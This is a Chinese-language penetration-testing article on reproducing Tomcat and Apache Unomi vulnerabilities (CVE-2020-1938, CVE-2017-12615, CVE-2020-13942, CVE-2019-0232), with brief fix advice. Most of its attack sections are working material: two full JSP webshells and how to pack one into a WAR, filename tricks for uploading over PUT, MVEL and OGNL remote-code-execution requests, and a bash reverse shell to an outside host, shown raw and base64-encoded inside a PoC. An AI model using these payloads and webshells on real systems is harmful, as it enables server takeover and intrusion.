> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/CJ3e4lx0AlLq_zJI4rHw2A)

**Tomcat 常见漏洞**

```
Tomcat是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，由Apache、Sun 和其他一些公司及个人共同开发而成。由于有了Sun 的参与和支持，最新的Servlet 和JSP 规范总是能在Tomcat 中得到体现，Tomcat 5支持最新的Servlet 2.4 和JSP 2.0 规范。因为Tomcat 技术先进、性能稳定，而且免费，因而深受Java 爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流行的Web 应用服务器
Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。
对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应HTML（标准通用标记语言下的一个应用）页面的访问请求。实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当你运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的
```

**漏洞汇总**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicWZAd8I2tVDykfjtgs0ZpojA4ibfKf7fdCzIeiaaJnzQ7FC0Nicf2ncaypA/640?wx_fmt=png)

**CVE-2020-1938 文件包含漏洞**

**漏洞描述**

  该漏洞是由于 Tomcat AJP 协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器 webapp 下的任意文件，如: webapp 配置文件或源代码等。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。

**漏洞影响版本**

```
Apache Tomcat 6
Apache Tomcat 7 < 7.0.100
Apache Tomcat 8 < 8.5.51
Apache Tomcat 9 < 9.0.31
```

**不受影响版本**

```
Apache Tomcat = 7.0.100
Apache Tomcat = 8.5.51
Apache Tomcat = 9.0.31
```

**漏洞分析**  

  Tomcat 在处理 ajp 协议时存在漏洞，可通过调用 request.setAttribute 为 Tomcat 设置任意 request 属性。复现发现 Tomcat ajp 协议存在 web 目录下任意文件读取漏洞以及 JSP 文件包含漏洞。  
  当 ajp URI 设置为非 jsp 路径时，Tomcat 会调用 DefaultServlet 处理，此时会导致 web 目录任意文件读取漏洞。

  当 ajp URI 设置为 jsp 路径时，Tomcat 会调用 JspServlet 处理，此时会导致 JSP 文件包含漏洞

**漏洞复现**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicWHuXS4B4Z3kL8Cwr3UgJ44vfhEibpH0QXpBQlfhJTDpWuZiaktMmOd6LA/640?wx_fmt=png)

1. 使用 nmap 扫描目标是否开启了 8009 端口

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicWF9jreeUyo2Ffic3gPcApuqfnZXpGTQ9p5QZW25EjSuD5yIfJiczPWd4Q/640?wx_fmt=png)

2. 使用 poc 扫描目标网站

```
下载地址: https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicWkCKZqMuibufAVtAGq44ibnHibopjtQnicG5YgowvpWFJ0Q6kJKKjN9D0XA/640?wx_fmt=png)

这里是读取 ROOT 路径下的 web.xml (默认为 ROOT)  
如果想换路径可以更改 POC 源码里的 / 的位置更换成想要查询的目录（只能在 webapps 下）比如 examples

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicWSEQSh51pyqnGCKGOlyIiaMnXChKyFBGPsygFvgaHqvJBUW4whoibasjg/640?wx_fmt=png)

**防御方式**

  1. 禁用 AJP 协议，在 tomcat 安装路径中找到 / conf/server.xml 文件，删除或注释下面这行代码：<Connector port="8009"protocol="AJP/1.3" redirectPort="8443" />  
  2. 升级到 tomcat 最新版本  
 3. 配置 secret 来设置 AJP 协议的认证凭证，如：<Connector port="8009"protocol="AJP/1.3" redirectPort="8443"address="YOUR_TOMCAT_IP_ADDRESS" secret="YOUR_TOMCAT_AJP_SECRET"/>

**Tomcat 后台弱口令漏洞**  

Tomcat 后台存在弱口令，进入网站后点击登录然后使用 burp 进行爆破测试

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicWicAC6a4ibHOydzTSBcaarQImUOqgQBic3rStv3eU0zzicARzTwKSDtOXYg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicWo97yUKMnqpw7I1ycCPbMCAbcVKibMH9jE4NEskSo1lQphsUfibUYEIhQ/640?wx_fmt=png)

    可以发现账户密码是利用 Authorization 该授权字段以 base64 方式传递账户信息的  
    发现加密方式后，拿去解密后发现他的数据传输是将账户与密码用冒号进行组合之后在用 base64 加密所传递的。构造字段进行爆破  
    使用 burp 抓包后发送到 Intrude 模块进行暴力破解

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicWCuL4zcPywS5aDdvZbGGxDUecWOU6HyvIiaHgicPAUM1VQUkeFdottiaGw/640?wx_fmt=png)

    通过上面的验证得到 tomat 数据传递格式为 username:password ，使用 burp 模糊测试模块中的 custom iteactor 自定义迭代类型的 payload，该类型的 payload 共分为 8 个占位符，每一个占位符又可以指定简单列表的 payload 类型。再根据占位的数值，于每一个 payload 列表区进行笛卡尔积生成集合组

 **简单理解就是: 设置占位符，利用数学中的笛卡尔积进行集合，去拼凑各种可能存在的 payload 可能列表**  
    设置格式如下:  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicWOA9PXH5pNASib8XrvuP7yXfyYVEjx4o9o5ZDcNgibGnZ9vwc7S2SgFAg/640?wx_fmt=png)

    按照 payload 类型进行设置 Position 参数，比如我们要爆破 Tomcat 数据。设置第一个 Position 参数就是 username 参数，然后再进行添加 paylaod 字典。依次类推第二个参数就是冒号 : , 第三个就是 password 字段。设置完成后再对数据字段进行 base64 编码就可以进行爆破。设置方法如下:

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicWOA9PXH5pNASib8XrvuP7yXfyYVEjx4o9o5ZDcNgibGnZ9vwc7S2SgFAg/640?wx_fmt=png)

    以上就是 tomcat 基础认证爆破，当然我们还可以去自己收集匹配号的三个字段字典或者 base64 加密过的字典以及 metasploit 中的 tomcat 爆破，更加方便进行爆破

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicW99lB1GtaZN7y08scqWaA25oDel2SqAibZjytxiaXL1ORFyAYibvCfHMdg/640?wx_fmt=png)

    成功爆破出账号密码，然后使用 base64 解码得出明文账号密码  
    使用爆破出的账号密码登录进去后台后发现有一个上传页面，直接上传一个 war 木马就可以

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicWPoBJh9H1MczynjuRIL1x5weLibj7F3OuVTZz9XEm0JcyVtXoPdpIdicA/640?wx_fmt=png)

**war 木马的制作过程**

1. 找到一个 jsp 的木马

```
<%
    if("023".equals(request.getParameter("pwd"))){
    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    out.print("<pre>");
    while((a=in.read(b))!=-1){
        out.println(new String(b));
    }
    out.print("</pre>");
}
%>
```

2. 将 sp 木马放入 jdk1.8.0_73bin 目录下，然后在 cmd 输出已下命令（注意是必须在 java 环境下的，必须使用管理员权限的）  

```
jar cvf  +部署的war木马 +自己bin目录下的jsp木马
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicWP2WSKHDYRMY0KWDpTFSSzsMno63tLfSaVrvSIjkkZ5eYzdJ04SbBzw/640?wx_fmt=png)

木马制作成功

**上传制作的 war 木马**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicWau17ic1BicSiahvbULGzc3Teibib5xFXLJO57ws4YCG7ZZIciaTNiaqnpkoog/640?wx_fmt=png)

可以看到已经成功上传了木马

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicWJGMe44OaSRYZ9dmhfsjxgaNnj1E0apOIc0pGshjeBiaOAd8KcS0nP3Q/640?wx_fmt=png)

访问上传的 1.jsp 目录然后就可以执行我们想要执行的系统命令

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicWLImvDSg1tiaeoZ17kqrhmPZkOSPpnXUodKtBNubjjkF3TNo0nKo0L1w/640?wx_fmt=png)

**CVE-2017-12615Tomcat 远程代码执行漏洞 (PUT 请求)**

**漏洞介绍**

    远程代码执行漏洞（CVE-2017-12615） 影响：Apache Tomcat 7.0.0 - 7.0.79（7.0.81 修复不完全）当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法，攻击者通过构造的攻击请求向服务器上传包含任意代码的 JSP 文件，造成任意代码执行，危害十分严重

**影响版本**

    Apache Tomcat 7.0.0 - 7.0.81

**漏洞利用前提:**

    需 Tomcat 开启了 HTTP PUT 请求

**漏洞原理分析**

   Tomcat 的 Servlet 是在 conf/web.xml 配置的，通过配置文件可知，当后缀名为 .jsp 和 .jspx 的时候，是通过 JspServlet 处理请求的：而其他的静态文件是通过 DefaultServlet 处理的：可以得知，“1.jsp”（末尾有一个和空格）并不能匹配到 JspServlet，而是会交由 DefaultServlet 去处理。  
    当处理 PUT 请求时：会调用 resources.bind：dirContext 为 FileDirContext：调用 rebind 创建文件：又由于 Windows 不允许 “ ” 作为文件名结尾，所以会创建一个 .jsp 文件，导致代码执行。

**环境搭建**

 下载 Tomcat，安装成功后，需要开启 HTTP PUT 请求，首先打开 Tomcat 目录，找到配置文件

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicW4rA1BV8WxibFrw1ibeh7SUNdor287oGWoxk5mZDicWKfl2TmJME6veOaA/640?wx_fmt=png)

    打开之后，寻找 readonly ，如图，他被禁用了，禁止 PUT 上传：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicWq40AFnrFPiclLIwsq6WG6hlp1QiaPlBCAicPNbfBqls7rGEvTM0xwNzPw/640?wx_fmt=png)

    找到 org.apache.catalina.servlets.DefaultServlet 方法，并添加以下命令，添加成功后重启一下即可

```
<init-param> 
        <param-name>readonly</param-name> 
        <param-value>false</param-value> 
</init-param>
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicWxLIdhZbAh0E7HGQ7csqTwIWJcAzuAI7OOvpOe9icAXQWGXBsVWkslcQ/640?wx_fmt=png)

**漏洞复现**

1. 使用 burp 进行抓包，将请求包发送到 repeater 模块中，将 GET 请求方法改为 OPTIONS，查看请求方法

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicWiarUU7mHqc0Fb0fib8A0G6ZicvtWacLRM7q4bgZFPxDrscpZNQmdN1jdw/640?wx_fmt=png)

2. 发现启用了 PUT 方法，使用 PUT 请求上传 jsp 木马

```
jsp马:
<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%>

<%!public static String excuteCmd(String c) {

StringBuilder line = new StringBuilder();

try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new 
InputStreamReader(pro.getInputStream()));

String temp = null;while ((temp = buf.readLine()) != null) {

line.append(temp+"\n");}buf.close();} catch (Exception e) {

line.append(e.getMessage());}return line.toString();}%> 
<%if("023".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){

out.println("<pre>"+excuteCmd(request.getParameter("cmd"))+"</pre>");}else{out.println(":-)");}%>
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicWU1P5sZeSo7L7m2DXDyWicG4W5ty8Hym8CwlobrdiafARCUqE8HMlAcNw/640?wx_fmt=png)

3. 页面状态码返回 201，表示木马写入成功  

4. 到页面中访问 (ip+1.jsp) url: http://219.153.49.228:47195/shell.jsp?cmd=ls%20/&pwd=023

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicW4sTuCGNtbsPeMjoREcica0nrnUOKm7dxxNqxS4htYqCRRvEOydvmS6A/640?wx_fmt=png)

5. **该漏洞实际上是利用了 window 下文件名解析的漏洞来触发的**。通过构造特殊后缀名，绕过 Tomcat 检测，让 Tomcat 用 DefaultServlet 的逻辑处理请求，从而上传 jsp webshell 文件  
有三种方法可以进行绕过

1 shell.jsp%20  
2 shell.jsp::$DATA  
3 shell.jsp/

**CVE-2020-13942 Apache Unomi 远程代码执行漏洞**

**Apache Unomi 简介**

    Apache Unomi 是一个基于标准的客户 / 数据平台（CDP，Customer Data Platform），用于管理在线客户和访客等信息，以提供符合访客隐私规则的个性化体验，比如 GDPR 和 “不跟踪” 偏好设置。其最初于 Jahia 开发，2015 年 10 月提交给了 Apache 孵化器。

    Apache Unomi 具有隐私管理、用户 / 事件 / 目标跟踪、报告、访客资料管理、细分、角色、A/B 测试等功能，它可以作为：  
Ø Web CMS 个性化服务  
Ø 原生移动应用的分析服务  
Ø 具有分段功能的集中配置文件管理系统  
Ø 授权管理中心

**漏洞描述**

    Apache Unomi 是一个基于标准的客户数据平台（CDP，Customer Data Platform），用于管理在线客户和访客等信息，以提供符合访客隐私规则的个性化体验，比如 GDPR 和 “不跟踪” 偏好设置。其最初于 Jahia 开发，2015 年 10 月 Unomi 成为 Apache 软件基金会项目。在 Apache Unomi 1.5.1 版本之前，攻击者可以通过精心构造的 MVEL 或 ONGl 表达式来发送恶意请求，使得 Unomi 服务器执行任意代码，漏洞对应编号为 CVE-2020-11975，而 CVE-2020-13942 漏洞是对 CVE-2020-11975 漏洞的补丁绕过，攻击者绕过补丁检测的黑名单，发送恶意请求，在服务器执行任意代码

**漏洞影响版本**

    Apache Unomi < 1.5.2

**环境搭建**

    使用 docker 一键搭建的 vulhub 靶场，访问页面 ip:8181  
    通过 8181 和 9443 两个端口都可以触发漏洞，本次使用 8181 端口进行漏洞复现

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicW74bkIuiaARtPicmjdfOm8iaIrLEf1MdLwJ8nMYvcdDJFh4JxsUHLtwbVg/640?wx_fmt=png)

**漏洞复现**

1. 打开靶场首页，使用 bp 进行抓包，发送到 Repeater 模块构造数据包

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicW0Q6Yb7ZyduMfPWr0VRdzXOFYTxzNlzFMGv8jLderdUxNfL6w6GLgrA/640?wx_fmt=png)

2. 将 GET 请求改为 POST 请求，删除多余的字段，保留 HOST，User-Agent 和 Content-Length 字段，然后添加以下数据，将 dnslog 换为自己的地址，然后发送数据包

```
POST /context.json HTTP/1.1
Host: 目标地址:8181
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) 
Chrome/86.0.4240.198 Safari/537.36
Content-Length: 495

{
    "filters": [
        {
            "id": "boom",
            "filters": [
                {
                    "condition": {
                         "parameterValues": {
                            "test": "script::Runtime r = Runtime.getRuntime(); r.exec(\"ping 
br9yb9.dnslog.cn\");"
                        },
                        "type": "profilePropertyCondition"
                    }
                }
            ]
        }
    ],
    "sessionId": "test"
}
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicWuzS8qFKcNn3azAibnzrSWXquYGicD6mD48YrwDvpG1wqPslSickGLwNyQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicWyhJyltvH2ynVKV9ruNOoNLWgEY72a9TU86HaDuIedUVs4evb0rdY3g/640?wx_fmt=png)

3. 可以使用此漏洞来反弹 shell，将 bash 反弹 shell 的命令进行编码，编码在线地址为 (http://www.jackson-t.ca/runtime-exec-payloads.html)

```
bash -i >& /dev/tcp/192.168.1.6/4444 0>&1
编码后为
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuNi80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}
```

4. 将编码后的 shell 添加到以下 poc 的执行系统命令的地方 ()

```
POST /context.json HTTP/1.1
Host: localhost:8181
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) 
Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 483

{
    "filters": [
        {
            "id": "sample",
            "filters": [
                {
                    "condition": {
                         "parameterValues": {
                            "": "script::Runtime r = Runtime.getRuntime(); r.exec(\"bash -c 
{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuNi80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}\");"
                        },
                        "type": "profilePropertyCondition"
                    }
                }
            ]
        }
    ],
    "sessionId": "sample"
}
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicW2NWMvibicjIzhfeR8KWicQdFJQe6BGWdNYamcdTKWZwrHttO2bh1a4gmw/640?wx_fmt=png)

成功反弹 shell

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicWovEiclZO0L1wNNKBVavVIMibBVKnYkPSmibUrceqloiaVhIZflQcUK14oQ/640?wx_fmt=png)

**上面使用的是通过 MVEL 表达式执行任意命令，以下使用 OGNL 表达式执行任意命令**

在漏洞首页抓取请求包然后发送到 Repeater 模块中构造数据包，构造的 poc 为

```
POST /context.json HTTP/1.1
Host: localhost:8181
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) 
Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 1064

{
    "personalizations":[
    {
      "id":"gender-test",
      "strategy":"matching-first",
      "strategyOptions":{
        "fallback":"var2"
      },
      "contents":[
        {
          "filters":[
            {
              "condition":{
                "parameterValues":{
                  "propertyName":"(#runtimeclass = #this.getClass().forName(\"java.lang.Runtime\")). 
 (#getruntimemethod = #runtimeclass.getDeclaredMethods().{^ #this.name.equals(\"getRuntime\")}[0]). 
 (#rtobj = #getruntimemethod.invoke(null,null)).(#execmethod = #runtimeclass.getDeclaredMethods().{? 
 #this.name.equals(\"exec\")}.{? #this.getParameters() 
 [0].getType().getName().equals(\"java.lang.String\")}.{? #this.getParameters().length < 2}[0]). 
 (#execmethod.invoke(#rtobj,\"touch /tmp/ognl\"))",
                  "comparisonOperator":"equals",
                  "propertyValue":"male"
                },
                "type":"profilePropertyCondition"
              }
            }
          ]
        }
      ]
    }
    ],
    "sessionId":"sample"
}
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicW479ibsf2xAVic0VAG1YRutvXhznPxjxPOiaV7HyECJJbzQpDrP16lVuPA/640?wx_fmt=png)

可以看到成功在 /tmp/ 目录下成功创建了一个文件，也可以利用这个漏洞反弹 shell

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicWPTpQPCXkibqFY32EMlY7Glic0M5mJpm6RliazoARBy6FViaR9uoH2mRWVQ/640?wx_fmt=jpeg)

**CVE-2019-0232 Apache Tomcat 远程代码执行漏洞**

**简介  
**

    Tomcat 服务器是一个免费的开放源代码的 Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试 JSP 程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好 Apache 服务器，可利用它响应 HTML（标准通用标记语言下的一个应用）页面的访问请求。实际上 Tomcat 是 Apache 服务器的扩展，但运行时它是独立运行的，所以当你运行 tomcat 时，它实际上作为一个与 Apache 独立的进程单独运行的

**漏洞描述**  

    该漏洞只对 Windows 平台有效，攻击者向 CGI Servlet 发送请求，可在具有 Apache Tomcat 权限的系统上注入和执行任意操作系统命令。漏洞成因是当将参数从 JRE 传递到 Windows 环境时，由于 CGI_Servlet 中的输入验证错误而存在该漏洞。CGI_Servlet 默认是关闭的

**漏洞影响范围**

```
Apache Tomcat 9.0.0.M1 ~ 9.0.17
Apache Tomcat 8.5.0 ~ 8.5.39
Apache Tomcat 7.0.0 ~ 7.0.93
```

**环境搭建**

    环境：Java8+Apache Tomcat 8.5.39

1. 安装 tomcat 需要 java 环境，jdk 下载地址 (https://www.oracle.com/java/technologies/javase-downloads.html)

2. 下载完后配置环境变量，输出 java -version 验证是否配置成功  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicWf9MQrPMBomkqLBAOSJdFXXjfLmcxblaGcLng7pMrEwnMBsuyyCCjDQ/640?wx_fmt=png)

3. 安装 tomcat8.5.39 版本，下载地址 (https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.39/bin/)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicWiaCcuqTcOEa4hPu56HibIxQFz8YWFjkpTguXrJORGUzu8gCRU5ey7gMQ/640?wx_fmt=png)

4. 下载完成后进行解压然后配置 tomcat，打开 Tomcat 按目录下的 confweb.xml 取消以下两项的注释，否则访问 cgi 目录会提示 404，默认情况下是注释的  

**Web.xml 文件 (两处代码都需要取消注释)**  

```
<servlet>
    <servlet-name>cgi</servlet-name>
    <servlet-class>org.apache.catalina.servlets.CGIServlet</servlet-class>
    <init-param>
      <param-name>debug</param-name>
      <param-value>0</param-value>
    </init-param>
    <init-param>
      <param-name>cgiPathPrefix</param-name>
      <param-value>WEB-INF/cgi-bin</param-value>
    </init-param>
    <init-param>
      <param-name>executable</param-name>
      <param-value></param-value>
    </init-param>
     <load-on-startup>5</load-on-startup>
</servlet> 

<!-- The mapping for the CGI Gateway servlet -->

<servlet-mapping>
    <servlet-name>cgi</servlet-name>
    <url-pattern>/cgi-bin/*</url-pattern>
</servlet-mapping>
```

修改在 conf/context.xml 中的 <Context> 添加 privileged="true" 语句

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicWTBKzvquEhnicIwiatgIhYZbuHFTQQgtF7anwG8RbKvogjy7ZAdGoMqyw/640?wx_fmt=png)

5. 在 webappsROOTWEB-INF 下创建一个 cgi-bin 文件夹，并在文件夹内创建一个 bat 文件写入

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicWJO4hNjVuMo554gVmn1K1BCaa4Mm1Mf835EKtJbxjh0k52MN3cVKdZw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicWna4T5f8lkq7D2iaARShCQeenOkNtkVoWLdFVUFIBChccxBQrY1kK4oA/640?wx_fmt=png)

6. 都配置完成之后进入 bin 目录下运行 startup.bat 启动 tomcat

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicWY1nWtJ5IRcKFgaVK2pasb6uABQ0mZMK8Ok5SiboLk23scC9TDZNEzPA/640?wx_fmt=png)

7. 访问搭建后的页面，若出现下图则说明搭建成功

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicWbtL6l78tU6LKbCKKVa12dVOdzU5l0vdXT2Xpib09IpVIDdAdusb8C2Q/640?wx_fmt=png)

**漏洞复现**

    1. 在浏览器访问, 执行 net user 命令

```
http://your-ip/cgi-bin/test.bat?&C%3A%5CWindows%5CSystem32%5Cnet%20user
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicWywzy4IEviajchSOammlciaJmJc3QngEWqbtmELuv9nPicdAr5b8y66u9w/640?wx_fmt=png)

    执行 whoami 命令

```
http://192.168.64.137:8080/cgi-bin/test.bat?c:/windows/system32/whoami.exe
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCGs4Dkg8x3ZjFFZzAjRQicWIMeumL3D7kMwTB4MBicghUMQaWYl28gMLHyzic4OX67shGhmeqcAC2Aw/640?wx_fmt=png)

**漏洞修复**

受影响版本的用户应该应用下列其中一项缓解。升级到：

```
Apache Tomcat 9.0.18或更高版本
Apache Tomcat 8.5.40或更高版本
Apache Tomcat 7.0.93或更高版本
```